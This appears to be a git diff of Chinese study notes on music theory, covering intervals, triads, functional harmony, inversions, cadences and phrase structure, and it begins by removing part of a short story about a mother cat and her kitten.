-+　　一天，在阳光照耀的屋檐上，母猫和小猫正在互相愉快地戏耍着。这时，从哪里传来了说话声：“只吃瘦成那样妈妈的奶水，这小猫还真够胖的。”这说话声，是从对面一扇高高的窗户里传来的。一个少女一边望着这边，一边对身后的妹妹说。怕吓着两只猫，两个人躲着不让猫发现。少女把手里的面包掰碎。突然，传来了一个响声，什么东西掉到了猫的身边。母猫吓了一跳，缩起身子，摆好架势，准备应战突如其来的不速之客。保护孩子比自己逃跑更重要！母猫环视了一下四周，可却没有找到敌人的影子，原来掉下来的是一块香喷喷的、涂着奶油的面包。
-+
-+　　“是谁扔的呢？”母猫疑惑了一下，抬头朝高高的窗户看去，只见两姐妹正看着这边笑呢！看到这个样子，母猫知道她们没有恶意，不过还是不敢大意，没有去接近食物。“是给你们的，吃吧！”为了让母猫放心，少女这样说道。小猫终于忍不住了，靠近了面包。母猫好像允许了似的，在一边看着。不知是不是为了让给孩子，自己才没有去吃。少女又掰了一块面包扔了过去。
-+
-+　　“这回是给你的。”
-+
-+　　母猫这才把掉在面前的面包慢慢地放进了嘴里。
-+
-+　　整个冬天，两只猫都住在这一带的屋顶上，一天到晚跑来跑去，寻找阳光。当春天到来的时候，小猫已经长得很大了。
-+
-+　　后街有一片街坊邻居种的田。田里的油菜开除了灿烂的黄花。对别人还是很有戒备的小猫，开始和喜欢自己的少女亲近起来。
-+
-+　　这时候，在飘着白云的天空下，小猫躲在叶子后面，正要去捉一只要落到油菜花上的白蝴蝶。虽然又回到了地面上，但母猫已经不再像以前那样追赶小猫，而是尽量地远离他，看着他尽情地玩耍。
-+
-+　　“马上就要独立生活了，我不会再跟着你了。”母猫嘴上没说，只是眯缝着眼睛，看小猫能不能捉到蝴蝶。
-+
-+　　同样在一旁观看的少女，觉得小猫的样子实在是可爱，就不声不响地绕到后面，出其不意地抱住了他，贴到了脸上。母猫目睹了这一切。这时，她就好像已经看穿了小猫今后的命运似的，“喵”，悲伤地尖叫了一声。只留下了这一声尖叫，然后她就不知跑到哪里去了。从此，母猫的身影再也没有在这一带出现过。
-+
-+　　“妈妈，收养这只小猫吧。”在姐妹俩再三恳求下，这一愿望终于实现了。
-+
-+　　从今往后，小猫在也不会挨雨淋，再也不会因为挨饿睡不着觉了。
-+
-+　　“你妈妈到哪里去了呢？你能受到大家的宠爱，真幸福啊！你妈妈肯定还在什么地方活着。”少女这样对小猫说。即使这样面对面，人和动物还是有间隔的。想法不一样，不管说什么也无法沟通，这让少女很伤心。
-+
-+　　冬天终于要过去了。一个狂风暴雨的夜晚，风吹着屋顶，敲打着窗户。一直在一动不动静听风声的小猫，突然变得焦躁不安起来，在屋子里闹个不停，要出到外面去。
-+
-+　　“这猫的样子有点反常啊！快把他放出去吧。”连少女的妈妈也这么说。姐姐把木窗打开了一条缝，狂风立刻吹了进来。
-+
-+　　“这么大的风，你要到哪儿去呀？”少女说。小猫冲到黑暗中，彷徨着如同在追随一个看不见的影子，不断悲切地叫着。
-+
-+　　“啊，一定是想起母猫了。”姐妹俩互相望了望。
-+
-+　　在那个屋顶上，母猫那领着小猫走路的消瘦的身影，清晰地浮现在两人的眼前。
-+
-+　　小猫好像跑到很远的地方去寻找母亲了。风声中断时，隐约可以听到他的叫声。大概是因为风声，不经意之中勾起了他那些难忘的记忆吧？那些在寒冷、狂风大作的夜晚，在静静的下着霜的黎明被母猫拥抱着安然入睡的记忆。
++- **反复修改是常态**
 \ No newline at end of file
+```
+
+## 第一章第七节：终止.md
+
+```diff
+
+@@ -0,0 +1,41 @@
++# 第一章第七节：终止
++
++## 概念
++
++- 一种和声进行方式
++- 标记一个结束
++- **由多个和声组成**
++- **旋律与和声相互组合**
++
++## PAC（Perfect Authentic Cadence，完满正格终止）
++
++- **和弦进行必须由 V 和弦转为 I 和弦**
++- **V，I 和弦不得使用转位**
++- **旋律必须结束在主音**（C 大调即为 C）
++
++## IAC（Imperfect Authentic Cadence，不完满正格终止）
++
++### 导和弦 IAC
++
++- 和弦进行由 vii° 和弦转为 I
++
++### 转位 IAC
++
++- 在 PAC 基础上，和弦使用转位
++
++### 原位 IAC
++
++- 在 PAC 基础上，旋律音不结束在主音即可
++
++## HC（Half Cadence，半终止）
++
++- 和弦停止在 V 即可
++
++## 终止进行和功能进行的区别
++
++- 组成
++  - 功能进行：纯粹由和声组成
++  - 终止进行：和声旋律相配合
++- 位置
++  - 功能进行：任意位置
++  - 终止进行： **音乐段落结尾**
+\ No newline at end of file
+```
+
+## 第一章第三节：和弦.md
+
+```diff
+
+@@ -0,0 +1,70 @@
++# 第一章第三节：和弦
++
++## 和弦
++
++- 同时发出两个或多个声音
++- 声音的特征和功能
++- 分类、整理和研究
++
++## 音程
++
++| 度\半音 |  0   |  1   |  2   |  3   |  4   |  5   |  6   |  7   |  8   |  9   |  10  |  11  |  12  |
++| :-----: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
++|  一度   |  纯  |      |      |      |      |      |      |      |      |      |      |      |      |
++|  二度   |      |  小  |  大  |      |      |      |      |      |      |      |      |      |      |
++|  三度   |      |      |      |  小  |  大  |      |      |      |      |      |      |      |      |
++|  四度   |      |      |      |      |      |  纯  |  增  |      |      |      |      |      |      |
++|  五度   |      |      |      |      |      |      |  减  |  纯  |      |      |      |      |      |
++|  六度   |      |      |      |      |      |      |      |      |  小  |  大  |      |      |      |
++|  七度   |      |      |      |      |      |      |      |      |      |      |  小  |  大  |      |
++|  八度   |      |      |      |      |      |      |      |      |      |      |      |      |  纯  |
++
++- 上表中：零半音即纯一度、一半音即小二度、二半音即大二度，以此类推
++
++## 三和弦
++
++### 基础概念
++
++- 三个音符按三度关系叠加构成的和弦
++- 三个音符从低到高： **根音、三音和五音**
++
++### 分类
++
++|   三和弦名   | 音程（根音到三音） | 音程（三音到五音） |       听感       |
++| :----------: | :----------------: | :----------------: | :--------------: |
++| **大三和弦** |       大三度       |       小三度       | 阳光、乐观、明亮 |
++| **小三和弦** |       小三度       |       大三度       | 柔和、忧郁、暗淡 |
++| **增三和弦** |       大三度       |       大三度       |       不适       |
++| **减三和弦** |       小三度       |       小三度       |       不适       |
++
++## 和弦表示法
++
++### 音名表示法
++
++- 常用于爵士乐，现代流行乐
++- 表示法：和弦根音英文字母 + 和弦特征符号
++- 示例（以 C 为例）：
++
++|  三和弦名  | 大三和弦 | 小三和弦 | 增三和弦 | 减三和弦 |
++| :--------: | :------: | :------: | :------: | :------: |
++| 音名表示法 |  C/Cmaj  | Cm/Cmin  | C+/Caug  | C°/Cdim  |
++
++### 罗马数字表示法
++
++- 常用于古典乐
++- 表示法
++  - 罗马数字 + 和弦特征符号
++  - 罗马数字 = **根音在当前调式中的位置**
++- 示例（以 C 本音为例）：
++
++|  三和弦名  | 大三和弦 | 小三和弦 | 增三和弦 | 减三和弦 |
++| :--------: | :------: | :------: | :------: | :------: |
++| 音名表示法 |    I     |    i     |    I+    |    i°    |
++
++### 数字低音表示法
++
++- 侧重于记录 **音程转位**
++- 表示法
++  - 写出最低音
++  - 一次往上写出三音，五音的距最低音的音程
++
+```
+
+## 第一章第九节：乐句概述.md
+
+```diff
+
+@@ -0,0 +1,43 @@
++# 第一章第九节：乐句概述
++
++## 定义
++
++- 乐句（Sentence）是由展示部（Presentation Phase）和发展部（Continuation Phase）构成的，完整的八小节音乐主题（Theme），它必须以终止（Cadence）结尾
++
++## 展示部（Presentation Phase）
++
++### 概述
++
++- 乐句前四个小节
++- 作用
++  - 展示主要特征
++  - 奠定基调
++- 基本结构
++  - 基本乐思
++  - 重复乐思
++
++### 展示部旋律重复方法
++
++- 严格重复（Exact Repetition）
++- 模进重复（Sequential Repetition）
++- 应答重复（Statement-Response Repetition）
++
++## 发展部（Continuation Phase）
++
++### 概述
++
++- 乐句后四个小节
++- 作用
++  - 打破展示部稳定性
++  - 以终止结束乐句
++- 基本结构
++  - 发展乐思
++  - 终止
++
++### 发展部可用技术
++
++- 旋律加速（Surface Rhythm Acceleration）
++- 和声加速（Harmonic Acceleration）
++- 模进进行（Sequential Progression）
++- 碎片化（Fragmentation）
++- 特征去除（Liquidation）
+\ No newline at end of file
+```
+
+## 第一章第二节：旋律发展趋势.md
+
+```diff
+
+@@ -0,0 +1,18 @@
++# 第一章第二节：旋律发展趋势
++
++## 张力
++
++- 推动音乐发展
++- **积累张力**
++  - 上升进行
++  - 短促音符
++- **释放张力**
++  - 下降进行
++  - 悠长音符
++
++## 四种发展趋势
++
++1. 上升进行
++2. 下降进行
++3. 交错进行
++4. 静止进行
+\ No newline at end of file
+```
+
+## 第一章第五节：流畅连接和弦.md
+
+```diff
+
+@@ -0,0 +1,26 @@
++# 第一章第五节：流畅连接和弦
++
++## 和弦转位
++
++- **和音一个音或几个音，提升或降低，一个或几个八度**
++
++## 概念
++
++- **根音、三音和五音不随音高发生变化**
++- 最高音、中间音、最低音，始终以音高高低为准
++
++## 三和弦转位分类
++
++### 原位和弦
++
++- **最低音为根音**
++- 不进行转位
++
++### 第一转位（Six Chord，六和弦）
++
++- **最低音为三音**
++
++### 第二转位（Six-Four Chord，四六和弦）
++
++- **最低音为五音**
++
+```
+
+## 第一章第八节：曲式.md
+
+```diff
+
+@@ -0,0 +1,36 @@
++# 第一章第八节：曲式
++
++## 主题（Theme）
++
++### 概述
++
++- 书写基本音乐单元
++
++### 分类
++
++- 紧凑型主题（Tight-Knit Theme）
++  - 乐句
++  - 乐段
++  - 小型二段体
++  - 小型三段体
++- 松散型主题（Loose Theme）
++- 混合主题（Hybrid Theme）
++- 复合主题（Compound Theme）
++  - 复乐句
++  - 复乐段
++
++## 音乐形式（Music Form）
++
++### 概述
++
++- 将主题组成曲目
++- **不可能掌握所有的音乐形式**
++  - 太多
++  - 可以创新
++- 此处只讨论标准的音乐形式
++
++### 基本形式
++
++- 二段体音乐形式
++- 回旋曲音乐形式
++- 主歌副歌体音乐形式
+\ No newline at end of file
+```
+
+## 第一章第六节：旋律和声搭配.md
+
+```diff
+
+@@ -0,0 +1,37 @@
++# 第一章第六节：旋律和声搭配
++
++## 考虑方面
++
++- 功能作用
++- 谐和程度
++
++## 功能作用搭配
++
++- 旋律张力
++  - 积攒或释放
++- 和声功能
++  - 稳定的主功能
++  - 不稳定的属功能和下属功能
++- **两者在功能作用上是否相同**
++
++## 谐和程度
++
++- **旋律音符，最好为和弦的和弦内音**
++
++## 和弦内音（Chord Tone）
++
++- 组成和弦的音符，即为和弦内音
++- 例：Cmaj = C E G
++
++## 提升审美
++
++- 刻板练习
++- 听歌
++  - 关注旋律与和声发展
++  - 偶尔为之即可
++  - 听歌 != 学习音乐
++- 反复练习
++  - 最笨
++  - 最枯燥
++  - 最浪费时间
++  - **最有效**
+\ No newline at end of file
+```
+
+## 第一章第十节：乐句展示部.md
+
+```diff
+
+@@ -0,0 +1,2 @@
++# 第一章第十节：乐句展示部
++
+```
+
+## 第一章第四节：功能和声.md
+
+```diff
+
+@@ -0,0 +1,87 @@
++# 第一章第四节：功能和声
++
++## 前注
++
++|        |    音阶    |      音阶      |     音阶     |     音阶     |    音阶    |     音阶     |    音阶    |
++| :----: | :--------: | :------------: | :----------: | :----------: | :--------: | :----------: | :--------: |
++|        |     5      |       6        |      7       |      1       |     2      |      3       |     4      |
++|        |     3      |       4        |      5       |      6       |     7      |      1       |     2      |
++|        |     1      |       2        |      3       |      4       |     5      |      6       |     7      |
++| 和弦名 |   **C**    |     **Dm**     |    **Em**    |    **F**     |   **G**    |    **Am**    |   **B_**   |
++| 级数名 |     I      |       ii       |     iii      |      IV      |     V      |      vi      |    vii°    |
++| 功能名 | **主和弦** | **副下属和弦** | **副属和弦** | **下属和弦** | **属和弦** | **副主和弦** | **导和弦** |
++
++## 功能和声
++
++### 概述
++
++| 和声功能 |    和弦    |     性质     | 符号 |
++| :------: | :--------: | :----------: | :--: |
++|  主功能  | I　iii　vi |     稳定     |  T   |
++|  属功能  |   V　vii   |    不稳定    |  D   |
++| 下属功能 |   IV　ii   | 介于两者之间 |  S   |
++
++### 主功能（Tonic Function）
++
++#### 概述
++
++- **符号为 T**
++- 稳定、平稳、放松和满足
++- 让音乐 **停下来**
++- 典型出现在 **开头和结尾**
++- 稳定，缺少向下发展的动力
++
++#### 和弦
++
++- I（最强）
++- iii
++- vi
++
++### 属功能（Dominant Function）
++
++#### 概述
++
++- **符号为 D**
++- 不稳定
++- 强烈的、继续发展下去的去世
++- 穿插在音乐发展过程中
++
++#### 和弦
++
++- V（最强）
++- vii°
++
++### 下属功能（Subdominant Function）
++
++#### 概述
++
++- **符号为 S**
++- 不稳定，但并不特别不稳定
++- 不稳定性：属功能 > 下属功能 > 主功能
++- 一般增加和弦连接多样性
++
++#### 和弦
++
++- IV（典型）
++- ii
++
++## 功能和声的作用
++
++- 写出 **和声进行**（Harmonic Progression）
++- 推动音乐发展
++- 使用功能和声写作的和声进行，称为 **功能进行**（Functional Progression）
++
++## 功能进行
++
++- 以主功能开头
++- <font style="color:red; font-weight:bold;">属功能 下一个必须连接到 主功能</font>
++- 其他任意
++
++## 名称由来
++
++|      音名      |   C   |     D      |    E    |      F      |    G     |     A      |      B       |
++| :------------: | :---: | :--------: | :-----: | :---------: | :------: | :--------: | :----------: |
++|    常用唱名    |  do   |     re     |   mi    |     fa      |   sol    |     la     |    si/ti     |
++| 第二种唱名系统 | Tonic | Supertonic | Mediant | Subdominant | Dominant | Submediant | Leading Tone |
++|    上文翻译    | 主音  |   上主音   |  中音   |   下属音    |   属音   |   下中音   |     导音     |
++
+```
+
+## 第一章：概述.md
+
+```diff
+
+@@ -0,0 +1,48 @@
++# 第一章：概述
++
++## 内容板块
++
++- 旋律写作方法
++- 和声创作方法
++- 旋律与和声的组合逻辑
++
++## 旋律写作
++
++- 音程旋律
++- 音程关系
++  - 半音
++  - 全音
++  - 度
++- 旋律发展趋势：张力
++  - 上升进行
++  - 下降进行
++  - 静止进行
++  - 交错进行
++
++## 和声创作
++
++- 和弦
++  - 三和弦
++    - 主和弦
++    - 属和弦
++    - 下属和弦
++  - 功能和声
++  - 和弦转位
++    - 原位
++    - 第一转位（六和弦）
++    - 第二转位（四六和弦）
++- 和弦旋律搭配
++- 终止进行
++  - PAC
++  - IAC
++  - HC
++
++## 曲式
++
++- 乐句
++  - 展示部
++  - 发展部
++- 乐段
++  - 先行部
++  - 后续部
++- 发展方法
+\ No newline at end of file
+```
+
+## 音乐.md
+
+```diff
+
+@@ -2,4 +2,4 @@
+ 
+ 所有音乐学习内容，收录于此。
+ 
+-包括不限于，乐理、和弦写作等。
+\ No newline at end of file
++包括不限于，乐理、和弦写作等。
 ```
